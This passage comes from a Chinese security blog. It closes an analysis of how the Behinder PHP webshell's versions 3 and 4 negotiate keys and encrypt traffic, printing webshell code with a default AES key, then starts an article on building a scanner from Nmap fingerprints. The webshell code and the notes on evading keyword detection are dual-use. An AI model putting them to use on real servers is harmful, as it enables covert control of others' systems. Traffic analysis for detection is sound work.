class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line"><span class="variable">$data</span>[<span class="variable">$i</span>] = <span class="variable">$data</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">openssl_encrypt</span>(<span class="variable">$data</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="variable">$content</span>=<span class="string">&quot;Y3dDMXpSa2o3OURScHlpcWNMVGVnNEt2ZVUyckR3SkJkcnVZakx4aGRXVnY3MkhkdHBkcFdYMXpJYkRQWVRPWmNhUDRMelhLdVZtT0VHczhCdDdqbmZQME5vOFEyVDdzTTNhajVHZWp4a2FHRkxiSU1UT1U1a0VWeGJIbmRwTkluU3liTkRienQ2QURXbllqOVZRNzRkbktBaGJVeEt2azFvM3M2MWNJU1pMZk1vQWdjY2Z3QnhMRHR1TnlETldaamJKVE8yOTFsU2pvak5jOGdrT2pKYlFwMTIzZnhSUXRHVmhrY05hdmNPbzV5a2tVR2JWQ2s=&quot;</span>;<span class="variable">$content</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$content</span>);</span><br><span class="line"><span class="title function_ invoke__">main</span>(<span class="variable">$content</span>);</span><br></pre></td></tr></table></figure><p>其中参数 content 就是本次密钥协商的凭证，服务段会用之前提到写入冰蝎 3PHP 马 AES 加密 content 内容，以响应的形式发回客户端。客户端再用协商的密钥解密响应包的 body，若有 content 相同，就代表客户端服务端持有的密钥一致，就可以开始愉快的通信。比起冰蝎 2 使用固定长度的 content 作为凭证，冰蝎 3 的 content 是 3000 字符以上的随机长度字符串，更添隐蔽性。<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fg5TALp7S6xmw01TTMyl2uamn_ci.png" alt="" />若服务端不能正确解码，则表示密钥错误或其他原因，一般连接失败冰蝎都会提示原因。如果第一个 POST 请求没有被及时或正确响应，客户端会发送第二次 POST 请求，若依旧未被正确解码，则恢复冰蝎 1 的密钥交换方式。如上图所示，一次 POST 请求的响应会 set 一个 cookie，两次 POST 请求 set 了两个 cookie；由于解码失败，上传的 webshell 中也没有配置处理 GET 请求的方法，于是 GET 请求的响应 body 是空的。</p><h2 id="冰蝎-4-密钥写入木马"><a class="markdownIt-Anchor" href="#冰蝎-4-密钥写入木马"></a> 冰蝎 4 密钥写入木马</h2><p>冰蝎 4 的 webshell 可以完全自定义加解密方式，作者称之为通信协议。到冰蝎 4.0.5，加密方式有以下几种：default_xor、default_xor_base64、default_aes、default_image、default_json、aes_with_magic。其中看到 github 上 issue 中提到 default_xor 可破解，本地测试使用 4.0.3 版本，default_xor 马连接不上，改其他加密方式就好了。使用前，需先配置传输协议，选择相应的协议名称，点击生成服务器。可以修改加解密代码，在下方测试加解密结果，最后点击保存。然后在冰蝎 jar 包的目录下会生成 server 文件夹，将其中的木马上传即可。<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fp2UxRXmqy9DUn42YOP1RZXDRQTs.png" alt="" />冰蝎 4 新增 shell 不需要任何参数，但必须指定传输协议，相应的传输协议需在上面的本步骤中保存到本地。<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FnZm4jwvMztKVtm55kWQhWyPfIwD.png" alt="" />之后使用 default_aes 方式作为示例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"><span class="variable">$content</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="variable">$result</span> = <span class="keyword">array</span>();</span><br><span class="line">   <span class="variable">$result</span>[<span class="string">&quot;status&quot;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">    <span class="variable">$result</span>[<span class="string">&quot;msg&quot;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$content</span>);</span><br><span class="line">    @<span class="title function_ invoke__">session_start</span>();  <span class="comment">//初始化session，避免connect之后直接background，后续getresult无法获取cookie</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">encrypt</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$result</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">Encrypt</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="variable">$key</span>=<span class="string">&quot;e45e329feb5d925b&quot;</span>; <span class="comment">//该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond</span></span><br><span class="line">      <span class="keyword">return</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">openssl_encrypt</span>(<span class="variable">$data</span>, <span class="string">&quot;AES-128-ECB&quot;</span>, <span class="variable">$key</span>,OPENSSL_PKCS1_PADDING));</span><br><span class="line">   &#125;</span><br><span class="line"><span class="variable">$content</span>=<span class="string">&quot;MzZjSHFEbUp2akZVSWNYVUhGb3Q4bnBQQVkzeXV6U2xEcWU0TjVsNEg1Y3ZCRmw3cnZrQ2ZXdzlsaVpzekxjcTE3b3JKT3hiMVVWTXVDNlNjNHplUFFnWk1PZjd0eWxvWEg3TTI2RGdCdDI2Ylg2dkx0cUNydmUzQ0lCMkg4WEZBbExEeEZDZHVyOUV0d3AwMnZJWUdKWHVScHA2YzR0VEozSHlldGtuc2JreW9NclpFSGJwZkMzT1NaSTFEMXVIQ211RFNTeFE0dTRWcDF5MUNEVXFGTUViNzZLaVRKYk5NejZxSlZGSTJBRzBxVUFidXVnOWxxbGVBbVN1cDJ3MEN0cTNlb2xLSGlJYkhBSk1RUVhYZVFyVmtjT2tTQU02S1plV25MYXdSaHUwZnVSRGU1dFRCR3NnVjB2bUljQzNZeFZLRDJnSVRDVVVBOHk5b0ZIb0V6NDQwTmVCTTJEWHVjQW5GakR4Mm9rdkdaMmpXNllVOExuZExkNUEydmE4dzFGTk1wRTdVeEs1a2ZCZG1QZktYVG9wcWYzanpSNGhEM2NIVGN3b3YyUHdMS1d5cVNLWkNWZzZOTWlSN0NvdHNkQVl0WWpGM1FDOEVJNUwyZ0hwRjRsZFVtM0hsekxvQjVROFBualV3cUZubXU4WWxndnMxWFR5ZkVJRHZQQXZqWW84b3htcjhoY254cUVQaHc1eG9VOUJHSnhFVThYOU5QeE52VWpIakhGTVp4U1NwSkJZczZDQnhRQ2JFcFJKYnBhZTBQSjh5eldjNWxBU3Z2ckYyZUw2RGNpczJJZzEwamhLa293ZTR1dFIxQXlOU3dxWWlZNVdrRFo0UjBXbHU0WTVEdkVIOTVGWlRUN0hHOWxEU0F0dXR5elFDUEdOOXlXNWl0NVFjbml3T0NaZmY3TzBFVlhzSzFRT1dvNXd3NmloZDVJMUZsbDlxcWMzVklxTjQ2UVVnTU5qOEtKNjFQdXNMendlRk1KNUMycFBoOFlFTko0VjNkUklEdkdKTFg3WEFBRFltZ284TDFmZko3bzlCUlpkT2E0SEY5UkNLc0RKMFNFWlg2aDk4Y2lBb2FwcmVvelFpSTVoSnp3ajBiQXFRWjFFS1hROEJCdWJvQTVqNWROdVRUYlBGTmo3WkNpWndHdUhGMXhBUVRLdFFkODdQNEFTaW82aTZOVHFYbVh6ZWZDMklQZ0N3YzJpeXBZNjdDT1o0VVBKd1JUYUpNSEdmUnhUMTVoNWV1M2VMNHZpNUNYYTdVak84VHY5N0FDS0dweUVTRGd6aXZUbFZoTldRcVk5cEtZUlViakhhTEcyN0Vhd2ZCZHhvMWdtWTNCVlI0bzNwbm9QdmJTUkkzaE9DVFl6ZVhXb1BIeE9NdXEydmZYM1E3dkJEUXk1VDBXVVVHeEdkS2phV3huQ2s4QUJjdHo5Y2tneVhPVks0SFJ3SmtTUFE0MUcwdGdXV0ZaNUttdE5oOHA5RWJDc25MWHlqaHFxd1FpbDlWeWs5Mk1IdVlWblhPNld0aEdSOWtiMGZsb1EzUEpRWWp1VURBdWZEcFp4Rm1EdnBNcjRCM1JZaFNwWnlZdDc3RUdrWFRtVVdkY0FYS0I1UjNCOXQ3Wkd1RlBiSk9xWXg0c2xmcDhiZWtIeGtCSUtvTTkyMHRHZXdTeDQ5WEFPQ2RYOHpWV1dZTElnQ09EcTlKRE5WVXRpa0V5SFlZT2YzUFdNdlR6cXJDeG9NcHdCTkt5d0FuT2t1STFFMWVmUElnOVpkcVFBbjd2a3E0V0lOOFlVaGNFYm5MUEZQY3BvYlJJVk5iSjhVTk9QdXcyZUdiSFF5cUtWOFkzUDRyZE41c01FNTJiMWRKWkZTZml3QVVRaUo4cTAySEtzcW42aGxWQnhOQXlRa1pJZzJCQmtrMFdVRzcwTkUxalFsTG1UYW92NTVqcmV1ZUhjS2hKVmVidkt4V3pyVmVKY2xBVFoxWGwxb0xwSFg2amdDbnBpd0I3NnpUcTRFTzhJdzFBdVlLNHpOa21Tb2RpWE1NZnBYekxmZ2gxZktSN1NhQms3ekZzNUc0NE9sTUpzeVM1VnhCMWV6ZnhaZUt5SkxEWldKemRYTVdTZHhSVE5hWXZYb3JpRzBpREgybDN4ZnpBYWJNZUd4ZVZTbDZBeGlUTzVoSjJIbTlsVTFjM214WXRNNmcxa1lGbm1VZElOUTFReVByTEZYdlIyckR0VTAzYWc4Y2w5WGFoYnI2eEx4VmpOZlhlOEFPa3psSVh3UTF4MUFjakV6eWpTanBJeERlSFN5NEFIOWZWc2ZZRmEwN1pjYUdoSGM4YXU5U21qejVueXBFbjNOeEFlMDNRT1E5N01YNngyUU1Y&quot;</span>;<span class="variable">$content</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$content</span>);</span><br><span class="line"><span class="title function_ invoke__">main</span>(<span class="variable">$content</span>);</span><br></pre></td></tr></table></figure><p>冰蝎 4 的 default aes 模式传的 payload 是 AES/ECB/PKCS5Padding，和前几代冰蝎不同，所以冰蝎 4 并不能兼容前几代冰蝎马，需要注意。密钥协商方式与冰蝎 3 一致，content 的生成方式也相同，但第一次 POST 请求没有被正确或及时响应不再重发。连接成功之后，客户端会自动 POST 请求 phpinfo。</p><h1 id="最后"><a class="markdownIt-Anchor" href="#最后"></a> 最后</h1><p>冰蝎每个版本之间其他方面的流量特征都有细微变化，但都具体写出来文章就显得冗长了。最后简单提一下，内置 UA 头更新、程序定义 http 头部字段不同、心跳包变化（长度、内容）等。对于 shell 实体的其他功能实现上都有不小的改进，随便哪个方面都是能新写一篇文章的程度，这里就不多说了。冰蝎的演化史，也是冰蝎“隐蔽”史，从功能实现、连接方式中很多角度都已看出冰蝎越来越阴，防不胜防。从更新日志上可以看得出冰蝎作者更新勤奋，撰写这篇文章期间冰蝎 4 小版本就出了三个，值得学习。而且从反编译的源码来看，每个大版本之间都改了很多，几乎重构，背后可以看出作者技术在不断精进。从冰蝎 1 到冰蝎 4，即使 webshell 的原理没有太大改变，作者在编写工具时投入的奇思和对于需求的考量也有很多值得参考的地方。个人水平和时间都有限，还有一些功能没有实际测试，比如冰蝎 4 的二进制服务端等各种炫酷功能，有机会一定尝试一下。因为主要关注 PHP 马，对于 JSP、ASP 的细节没有深入研究，这里也有空补上。还有一点，虽然使用冰蝎加密流量能够规避关键字检测，但在护网期间学习到蓝队直接把 IDS 设备放在负载均衡后面，到 IDS 的流量理应都是明文，请求体还是加密的流量基本可以全封了（还是有误报概率的，建议结合实际情况来看）。参考资料：<a href="https://xz.aliyun.com/t/2774">利用动态二进制加密实现新型一句话木马之 PHP 篇</a><a href="https://xz.aliyun.com/t/2799">利用动态二进制加密实现新型一句话木马之客户端篇</a><a href="https://github.com/rebeyond/Behinder">“冰蝎”动态二进制加密网站管理客户端</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Nmap服务识别指纹库利用</title>
      <link href="/2022/07/19/Nmap%E6%9C%8D%E5%8A%A1%E8%AF%86%E5%88%AB%E6%8C%87%E7%BA%B9%E5%BA%93%E5%88%A9%E7%94%A8/"/>
      <url>/2022/07/19/Nmap%E6%9C%8D%E5%8A%A1%E8%AF%86%E5%88%AB%E6%8C%87%E7%BA%B9%E5%BA%93%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>指纹库：</p><p>json 化方法：</p><h1 id="nmap-服务检测流量分析"><a class="markdownIt-Anchor" href="#nmap-服务检测流量分析"></a> Nmap 服务检测流量分析</h1><p>client 131 server130 端口[80,3306]，在 client 上运行 nmap，命令：<code>nmap -sC -sV -p 80,3306 192.168.42.130</code>通信流量例子：<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fn9fegmoXqic9Zbv3HoqAfwYrmWp.png" alt="" />在 nmap 运行的 client 上会根据目标端口个数启用自身端口与之通信，例如目标端口[80,3306]，client 33776 端口和 server 80 端口通信，client 56362 和 server 3306 端口通信，每个端口依次开始通信的时间会间隔大约 1s，可以并行实现，提高检测速度。</p> <span id="more"></span><h1 id="服务检测原理分析"><a class="markdownIt-Anchor" href="#服务检测原理分析"></a> 服务检测原理分析</h1><p>以 80 端口为例:<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FtDnEsJPkNbCIkESmM6-PaUBTX0C.png" alt="" />下面是一个最简单的探针（probe）的通信流程：<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FhSk-BC04Nty0UXQkNwcSwWmjJAy.svg" alt="" />基本就是先 TCP 三次握手，然后发探针，根据响应的内容，与指纹库中的 pattern 匹配，即可完成服务识别。然后是一个复杂的探针：<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Ft9P8YLkjGTupxGhL5wW96g3hTT8.png" alt="" />和它的流量：<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FlTwWmy8KOfL-xYR8gV4uTWJTZaP.png" alt="" />可以看到 TCP 协议加上“probestring”的内容就变成 http 包了，之后的数据通信依旧是 TCP 包，最后响应是 http 包。</p><h1 id="实现过程"><a class="markdownIt-Anchor" href="#实现过程"></a> 实现过程</h1><h3 id="tcp-探针"><a class="markdownIt-Anchor" href="#tcp-探针"></a> tcp 探针</h3><p>下面是 json 格式指纹库中的一个 tcp 探针例子：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">       <span class="attr">&quot;protocol&quot;</span><span class="punctuation">:</span> <span class="string">&quot;TCP&quot;</span><span class="punctuation">,</span></span><br><span class="line">       <span class="attr">&quot;probename&quot;</span><span class="punctuation">:</span> <span class="string">&quot;GetRequest&quot;</span><span class="punctuation">,</span></span><br><span class="line">       <span class="attr">&quot;probestring&quot;</span><span class="punctuation">:</span> <span class="string">&quot;GET / HTTP/1.0\\r\\n\\r\\n&quot;</span><span class="punctuation">,</span></span><br><span class="line">       <span class="attr">&quot;ports&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">           <span class="string">&quot;1&quot;</span><span class="punctuation">,</span></span><br><span class="line">           .......</span><br><span class="line">           <span class="string">&quot;8080-8085&quot;</span><span class="punctuation">,</span></span><br><span class="line">           .......</span><br><span class="line">       <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">       <span class="attr">&quot;sslports&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">           .......</span><br><span class="line">           <span class="string">&quot;60443&quot;</span></span><br><span class="line">       <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">       <span class="attr">&quot;totalwaitms&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">       <span class="attr">&quot;tcpwrappedms&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">       <span class="attr">&quot;rarity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1&quot;</span><span class="punctuation">,</span></span><br><span class="line">       <span class="attr">&quot;fallback&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">       <span class="attr">&quot;matches&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">           <span class="punctuation">&#123;</span></span><br><span class="line">               <span class="attr">&quot;pattern&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^&lt;\\?xml version=\\\&quot;1\\.0\\\&quot;\\?&gt;\\r\\n&lt;!DOCTYPE cross-domain-policy SYSTEM \\\&quot;/xml/dtds/cross-domain-policy\\.dtd\\\&quot;&gt;\\r\\n&lt;cross-domain-policy&gt;\\r\\n    &lt;!-- This is a master socket policy file --&gt;\\r\\n    &lt;!-- No other socket policies on the host will be permitted --&gt;\\r\\n    &lt;site-control permitted-cross-domain-policies=\\\&quot;master-only\\\&quot;/&gt;\\r\\n    &lt;!-- This will allow access to port 1800 --&gt;\\r\\n    &lt;allow-access-from domain=\\\&quot;([^\\\&quot;]*)\\\&quot; to-ports=\\\&quot;([^\\\&quot;]*)\\\&quot;/&gt;\\r\\n&lt;/cross-domain-policy&gt;\\r\\n&quot;</span><span class="punctuation">,</span></span><br><span class="line">               <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;adobe-crossdomain&quot;</span><span class="punctuation">,</span></span><br><span class="line">               <span class="attr">&quot;pattern_flag&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">               <span class="attr">&quot;versioninfo&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                   <span class="attr">&quot;cpename&quot;</span><span class="punctuation">:</span> <span class="string">&quot;h:snom:870&quot;</span><span class="punctuation">,</span></span><br><span class="line">                   <span class="attr">&quot;devicetype&quot;</span><span class="punctuation">:</span> <span class="string">&quot;VoIP phone&quot;</span><span class="punctuation">,</span></span><br><span class="line">                   <span class="attr">&quot;hostname&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">                   <span class="attr">&quot;info&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Snom 870 VoIP phone; domain: $1; ports: $2&quot;</span><span class="punctuation">,</span></span><br><span class="line">                   <span class="attr">&quot;operatingsystem&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">                   <span class="attr">&quot;vendorproductname&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Adobe cross-domain policy&quot;</span><span class="punctuation">,</span></span><br><span class="line">                   <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">               <span class="punctuation">&#125;</span></span><br><span class="line">           <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">   ......</span><br></pre></td></tr></table></figure><p>&quot;protocol&quot;指定走 TCP 还是 UDP，&quot;probestring&quot;指定携带的 payload。只要目标端口在 ports 里，就可以使用该探针进行测试，根据响应内容，使用 pattern 进行正则匹配，匹配成功就可以得到服务名称，甚至是服务版本了。</p><ul><li>方法一 构造 TCP 包</li></ul><p>使用 scapy 包实现三次握手是可行的，但是在实现过程中，需要精心构造 tcp 协议的各个字段，否则就会出现下面这张图的场景：<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FpChNN70xKPetCpnY_Z5Zpxo5ZnV.png" alt="" /></p><p>这里面 TCP 的错误提示全部遇到过，观察 nmap 的流量，可以看到其 tcp 协议中的 options 字段如下：<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fp_pxRf1x6CcM3ZE8PCvipJf5edA.png" alt="" /></p><p>推测缺少某些关键的可选字段是 TCP 协议经常报错的主要原因。虽然不影响服务 mysql 的检出，该服务的探针位于指纹库首位，而且该探针没有 payload，比较特殊，所以该方法不一定对其他服务也生效。</p><ul><li>方法 2 socket 连接</li></ul><p>一个流式 socket 连接首先会进行 tcp 三次握手，符合要求，然后再发送探针，接收数据即可。值得注意的是，http 探针的 probestring：<code>&quot;GET / HTTP/1.0\\r\\n\\r\\n&quot;</code>，后面的<code>\r\n</code>转二进制没有被正确解码，需要自己添加。或者我写了个探针转字节码的函数，感觉有点累赘，但可以规避其他错误（\0 转义等）：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">def probestr2bytes(probe)<span class="punctuation">:</span></span><br><span class="line">    probe = probe.split(<span class="string">&quot;\\&quot;</span>)</span><br><span class="line">    # 拆开类似这样&#x27;x07version&#x27;的字符串</span><br><span class="line">    for sub in probe<span class="punctuation">:</span></span><br><span class="line">        if len(sub) &gt; <span class="number">3</span><span class="punctuation">:</span></span><br><span class="line">            if sub<span class="punctuation">[</span><span class="number">0</span><span class="punctuation">]</span> == <span class="string">&quot;x&quot;</span> and len(sub) &gt; <span class="number">3</span><span class="punctuation">:</span></span><br><span class="line">                sub1 = <span class="punctuation">[</span>sub<span class="punctuation">[</span><span class="punctuation">:</span><span class="number">3</span><span class="punctuation">]</span><span class="punctuation">]</span></span><br><span class="line">                sub2 = <span class="punctuation">[</span>sub<span class="punctuation">[</span><span class="number">3</span><span class="punctuation">:</span><span class="punctuation">]</span><span class="punctuation">]</span></span><br><span class="line">                idx = probe.index(sub)</span><br><span class="line">                probe = probe<span class="punctuation">[</span><span class="punctuation">:</span>idx<span class="punctuation">]</span> + sub1 + sub2 + probe<span class="punctuation">[</span>idx + <span class="number">1</span><span class="punctuation">:</span><span class="punctuation">]</span></span><br><span class="line">    # 转字节码，有&#x27;x72&#x27;，&#x27;version&#x27;，&#x27;<span class="number">0</span>&#x27;，&#x27;r&#x27;<span class="punctuation">,</span> &#x27;n&#x27;，四种类型</span><br><span class="line">    result_bytes = b&#x27;&#x27;</span><br><span class="line">    for sub in probe<span class="punctuation">:</span></span><br><span class="line">        if len(sub) &gt; <span class="number">0</span><span class="punctuation">:</span></span><br><span class="line">            # &#x27;x72&#x27;</span><br><span class="line">            if sub<span class="punctuation">[</span><span class="number">0</span><span class="punctuation">]</span> == <span class="attr">&quot;x&quot;</span><span class="punctuation">:</span></span><br><span class="line">                # print(int(sub<span class="punctuation">[</span><span class="number">1</span><span class="punctuation">:</span><span class="punctuation">]</span><span class="punctuation">,</span> <span class="number">16</span>))</span><br><span class="line">                result_bytes += bytes(<span class="punctuation">[</span>int(sub<span class="punctuation">[</span><span class="number">1</span><span class="punctuation">:</span><span class="punctuation">]</span><span class="punctuation">,</span> <span class="number">16</span>)<span class="punctuation">]</span>)</span><br><span class="line">            # &#x27;<span class="number">0</span>&#x27;空字符</span><br><span class="line">            elif sub == <span class="attr">&quot;0&quot;</span><span class="punctuation">:</span></span><br><span class="line">                result_bytes += &#x27;\<span class="number">0</span>&#x27;.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">            elif sub == <span class="attr">&quot;r&quot;</span><span class="punctuation">:</span></span><br><span class="line">                result_bytes += &#x27;\r&#x27;.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">            elif sub == <span class="attr">&quot;n&quot;</span><span class="punctuation">:</span></span><br><span class="line">                result_bytes += &#x27;\n&#x27;.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">            else<span class="punctuation">:</span></span><br><span class="line">                result_bytes += sub.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    return result_bytes</span><br></pre></td></tr></table></figure><p>成功识别成 http 协议:<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FnvqZrCoydXnttQzUPMBSFqRjvxP.png" alt="" /></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">for string in port_TCP_padding<span class="punctuation">[</span>port<span class="punctuation">]</span><span class="punctuation">:</span></span><br><span class="line">    # print(<span class="string">&quot;start TCP probe&quot;</span> + string<span class="punctuation">[</span><span class="number">0</span><span class="punctuation">]</span>)</span><br><span class="line">    # 三次握手</span><br><span class="line">    try<span class="punctuation">:</span></span><br><span class="line">        s = socket.socket()</span><br><span class="line">        s.connect((ip<span class="punctuation">,</span> port))</span><br><span class="line">        # 使用scapy库中的sr系列函数收包</span><br><span class="line">        ss = StreamSocket(s<span class="punctuation">,</span> Raw)</span><br><span class="line">        # # 响应包数据文件不会很大，所以只收一个响应包即可，使用sr1</span><br><span class="line">        response = ss.sr1(Raw(probestr2bytes(string<span class="punctuation">[</span><span class="number">0</span><span class="punctuation">]</span>))<span class="punctuation">,</span> timeout=<span class="number">0.5</span><span class="punctuation">,</span> verbose=<span class="number">0</span>)</span><br><span class="line">        s.close()</span><br><span class="line">        if response<span class="punctuation">:</span></span><br><span class="line">            # 遍历匹配表达式</span><br><span class="line">            for match in string<span class="punctuation">[</span><span class="number">1</span><span class="punctuation">]</span><span class="punctuation">:</span></span><br><span class="line">                if re.match(pattern=match<span class="punctuation">[</span><span class="string">&quot;pattern&quot;</span><span class="punctuation">]</span>.encode(&#x27;utf<span class="number">-8</span>&#x27;)<span class="punctuation">,</span> string=response<span class="punctuation">[</span>Raw<span class="punctuation">]</span>.load)<span class="punctuation">:</span></span><br><span class="line">                    # 输出结果</span><br><span class="line">                    info = str(port) + <span class="string">&quot; &quot;</span> + match<span class="punctuation">[</span><span class="string">&quot;name&quot;</span><span class="punctuation">]</span></span><br><span class="line">                    print(info)</span><br><span class="line">    except Exception as e<span class="punctuation">:</span></span><br><span class="line">        break</span><br></pre></td></tr></table></figure><p>扫描结果：<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fl9dxqs5tRy3ArNCEX4uhdLhMhMS.png" alt="" /></p><h3 id="udp-探针"><a class="markdownIt-Anchor" href="#udp-探针"></a> udp 探针</h3><p>这个地方深坑，一开始使用 scapy 实现收发 udp 包，但是发现 scapy 收不到 udp 的响应包，而在 wireshark 里一切正常，自制扫描器与 nmap 扫描的流量基本一致，关了防火墙也是如此。上网搜索原因，未果，放弃。遂继续使用 socket 库实现收发功能，一切正常。值得注意的是，需要设置 timeout，要不然没有响应包就会一直卡在接收函数上。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">for string in port_UDP_padding<span class="punctuation">[</span>port<span class="punctuation">]</span><span class="punctuation">:</span></span><br><span class="line">    ANY = <span 